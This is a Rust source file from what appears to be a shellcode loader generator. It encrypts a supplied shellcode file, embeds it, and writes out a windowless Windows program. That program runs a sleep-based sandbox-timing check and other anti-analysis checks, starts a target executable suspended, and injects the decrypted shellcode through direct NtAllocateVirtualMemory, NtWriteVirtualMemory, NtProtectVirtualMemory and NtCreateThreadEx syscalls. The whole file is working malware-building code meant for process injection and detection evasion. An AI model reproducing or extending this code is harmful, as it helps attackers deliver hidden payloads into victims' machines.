use std::path::PathBuf;

use crate::crypt::{self, AuxConst};
use crate::emit::{
    CrateMeta, EmitError, EmittedFile, FileBody, Item, LoaderProgram, Namebook, Section,
};
use crate::spec::{EncryptionKind, BuildSpec};

pub fn build(
    recipe: &BuildSpec,
    names: &Namebook,
    target_exe: &str,
) -> Result<LoaderProgram, EmitError> {
    let raw = std::fs::read(&recipe.shellcode_path).map_err(EmitError::Io)?;
    let out = crypt::encrypt(recipe.encryption, &raw, recipe.seed.0);

    let mut files: Vec<EmittedFile> = Vec::new();
    files.push(EmittedFile {
        rel_path: PathBuf::from("src/embed/blob.bin"),
        body: FileBody::Bytes(out.blob.clone()),
    });
    files.push(EmittedFile {
        rel_path: PathBuf::from("src/main.rs"),
        body: FileBody::Source(emit_main(recipe, names, target_exe, &out.key, &out.aux)),
    });

    let mut features: Vec<&'static str> = vec![
        "Win32_Foundation",
        "Win32_Security",
        "Win32_System_Memory",
        "Win32_System_Threading",
    ];
    for c in &recipe.checks {
        if matches!(c.id, crate::spec::CheckId::VecInt3) {
            push_unique(&mut features, "Win32_System_Diagnostics_Debug");
            push_unique(&mut features, "Win32_System_Kernel");
        }
    }
    let mut extra_deps: Vec<String> = Vec::new();
    for d in crypt::extra_emit_deps(recipe.encryption) {
        extra_deps.push(d.to_string());
    }

    let meta = CrateMeta {
        crate_name: names.crate_name.clone(),
        is_cdylib: false,
        extra_deps,
        extra_features_windows_sys: features,
    };

    Ok(LoaderProgram { crate_meta: meta, files })
}

fn emit_main(
    recipe: &BuildSpec,
    n: &Namebook,
    target_exe: &str,
    key: &[u8],
    aux: &[AuxConst],
) -> Vec<Section> {
    let mut sections: Vec<Section> = Vec::new();

    sections.push(Section::InnerAttrs(vec![
        "#![allow(non_snake_case, non_upper_case_globals, dead_code)]".into(),
        "#![windows_subsystem = \"windows\"]".into(),
    ]));

    sections.push(Section::Uses(vec![
        "use core::ffi::c_void;".into(),
        "use core::ptr::null_mut;".into(),
        "use windows_sys::Win32::Foundation::CloseHandle;".into(),
        "use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};".into(),
        "use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};".into(),
        "use windows_sys::core::s;".into(),
        "use dyncvoke::dyncvoke_core::syscall;".into(),
    ]));

    let mut items: Vec<Item> = Vec::new();

    items.push(Item::Const {
        name: n.const_key.clone(),
        ty: format!("[u8; {}]", key.len()),
        value: array_literal(key),
    });
    items.push(Item::Const {
        name: n.const_blob.clone(),
        ty: "&[u8]".into(),
        value: "include_bytes!(\"embed/blob.bin\")".into(),
    });
    for ax in aux {
        if ax.tag == 'r' {
            items.push(Item::Const {
                name: n.const_rpoint.clone(),
                ty: format!("[u8; {}]", ax.bytes.len()),
                value: array_literal(&ax.bytes),
            });
        }
    }

    items.push(Item::Fn {
        sig: format!("fn {}(ms: i64)", n.fn_nap),
        body: "    let t: i64 = -(ms * 10_000);\n    let _ = syscall!(\"NtDelayExecution\", 0u32, &t as *const i64);".into(),
    });

    let decoder = crate::crypt::loader_decoder_items(recipe.encryption, n);
    items.extend(decoder);

    items.push(Item::Fn {
        sig: format!("fn {}() -> bool", n.fn_timing),
        body: format!(
            "    let t0 = std::time::Instant::now();\n    {}(2500);\n    t0.elapsed().as_millis() >= 2200",
            n.fn_nap
        ),
    });

    let check_items = crate::emit::checks::items_for(recipe, n);
    items.extend(check_items);

    let check_calls: String = recipe
        .checks
        .iter()
        .map(|c| format!("    {}();\n", crate::emit::checks::callable_for(c.id, n)))
        .collect();

    let dec_call = decode_call(recipe.encryption, n);
    let escaped = target_exe.replace('\\', "\\\\").replace('"', "\\\"");
    let main_body = format!(
        r#"    if !{ts}() {{ return; }}
{calls}    unsafe {{
        let target: *const u8 = s!("{target}");
        let si = core::mem::zeroed::<STARTUPINFOA>();
        let mut pi = core::mem::zeroed::<PROCESS_INFORMATION>();
        let ok = CreateProcessA(
            core::ptr::null(),
            target as _,
            core::ptr::null(),
            core::ptr::null(),
            0,
            CREATE_SUSPENDED,
            core::ptr::null(),
            core::ptr::null(),
            &si,
            &mut pi,
        );
        if ok == 0 {{ return; }}

        let proc_handle = pi.hProcess as *mut c_void;
        let shell = {dec_call};

        let mut base: *mut c_void = null_mut();
        let mut size = shell.len();
        let _ = syscall!("NtAllocateVirtualMemory", proc_handle, &mut base as *mut _, 0usize, &mut size as *mut _, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if base.is_null() {{
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return;
        }}

        let mut wrote: usize = 0;
        let _ = syscall!("NtWriteVirtualMemory", proc_handle, base, shell.as_ptr() as *mut c_void, shell.len(), &mut wrote as *mut _);

        let mut old: u32 = 0;
        let mut rsz = size;
        let _ = syscall!("NtProtectVirtualMemory", proc_handle, &mut base as *mut _, &mut rsz as *mut _, PAGE_EXECUTE_READ, &mut old as *mut _);

        const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;
        let mut thread: *mut c_void = null_mut();
        let _ = syscall!(
            "NtCreateThreadEx",
            &mut thread as *mut *mut c_void,
            THREAD_ALL_ACCESS,
            null_mut::<c_void>(),
            proc_handle,
            base,
            null_mut::<c_void>(),
            0u32,
            0usize,
            0usize,
            0usize,
            null_mut::<c_void>()
        );

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }}"#,
        ts = n.fn_timing,
        calls = check_calls,
        target = escaped,
        dec_call = dec_call,
    );

    items.push(Item::Fn {
        sig: "fn main()".into(),
        body: main_body,
    });

    sections.push(Section::Items(items));
    sections
}

fn decode_call(kind: EncryptionKind, n: &Namebook) -> String {
    match kind {
        EncryptionKind::Ecies => format!(
            "{}({}, &{}, &{})",
            n.fn_decode, n.const_blob, n.const_key, n.const_rpoint
        ),
        _ => format!("{}({}, &{})", n.fn_decode, n.const_blob, n.const_key),
    }
}

fn push_unique(v: &mut Vec<&'static str>, s: &'static str) {
    if !v.contains(&s) {
        v.push(s);
    }
}

fn array_literal(bytes: &[u8]) -> String {
    let mut out = String::from("[");
    for (i, b) in bytes.iter().enumerate() {
        if i > 0 {
            out.push_str(", ");
        }
        out.push_str(&format!("0x{:02x}", b));
    }
    out.push(']');
    out
}
